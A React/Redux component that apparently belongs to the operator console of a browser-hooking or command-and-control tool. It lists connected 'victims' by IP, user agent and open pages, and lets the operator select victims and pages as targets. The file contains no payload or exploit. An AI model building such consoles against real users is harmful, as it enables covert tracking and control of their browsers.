import React, {Component} from 'react'
import PropTypes from 'prop-types'
import {connect} from 'react-redux'
import {bindActionCreators} from 'redux'
import { Label, Table } from 'semantic-ui-react'
import './Victim.css'

import * as victimActions from '../../actions/victims';

class Victims extends Component {
  componentDidMount() {
    const { actions } = this.props
    this._socket = this.props.socket

    this._socket.on('newVictim', actions.addVictim)
    this._socket.on('updateVictim', actions.updateVictim)
    this._socket.on('victimDisconnect', actions.removeVictim)

    this._socket.emit('getUsers')
  }

  render() {
    const { actions, activeTargets, victims } = this.props
    return (
      <div className="block">
        <h3 className="ui dividing header">Victims</h3>
        <Table size="large" selectable id="victim-table">
          <Table.Header>
            <Table.Row>
              <Table.HeaderCell>ID</Table.HeaderCell>
              <Table.HeaderCell>IP</Table.HeaderCell>
              <Table.HeaderCell className='eight wide'>Agent</Table.HeaderCell>
              <Table.HeaderCell>Active Pages</Table.HeaderCell>
              <Table.HeaderCell>Time Connected</Table.HeaderCell>
            </Table.Row>
          </Table.Header>
          <Table.Body>
            {
              Object.values(victims).map((victim, idx) => (
                [<Table.Row
                  key={idx}
                  onClick={() => actions.targetVictim(victim.visibleId)}
                  className={activeTargets[victim.visibleId] ? 'active' : ''}
                >
                  <Table.Cell>{victim.visibleId}</Table.Cell>
                  <Table.Cell>{victim.ip === '1' ? '127.0.0.1' : victim.ip}</Table.Cell>
                  <Table.Cell>{victim.agent}</Table.Cell>
                  <Table.Cell>{Object.keys(victim.activePagesBySocketId).length}</Table.Cell>
                  <Table.Cell>{new Date(victim.connectedAt).toLocaleString()}</Table.Cell>
                </Table.Row>,
                activeTargets[victim.visibleId]
                  &&
                Object.values(victim.activePagesBySocketId).map((page, ind)=>{
                  return <Table.Row
                    key={`${idx}_pg_${ind}`}
                    onClick={()=>{ actions.targetPage(page.socketId) }}
                    className={page.targeted ? 'active' : ''}
                  >
                    <Table.Cell><Label ribbon>page</Label></Table.Cell>
                    <Table.Cell></Table.Cell>
                    <Table.Cell>{page.url}</Table.Cell>
                    <Table.Cell></Table.Cell>
                    <Table.Cell>{new Date(page.connectedAt).toLocaleString()}</Table.Cell>
                  </Table.Row>
                })]
              ))
            }
          </Table.Body>
        </Table>
      </div>
    )
  }
}

Victims.propTypes = {
  victims: PropTypes.object,
  activeTargets: PropTypes.object
}

function mapStateToProps(state, props) {
  return {
    victims: state.victims.victims,
    activeTargets: state.victims.activeTargets
  }
}

function mapDispatchToProps(dispatch) {
  return {
    actions: bindActionCreators(victimActions, dispatch)
  }
}

export default connect(mapStateToProps, mapDispatchToProps)(Victims)
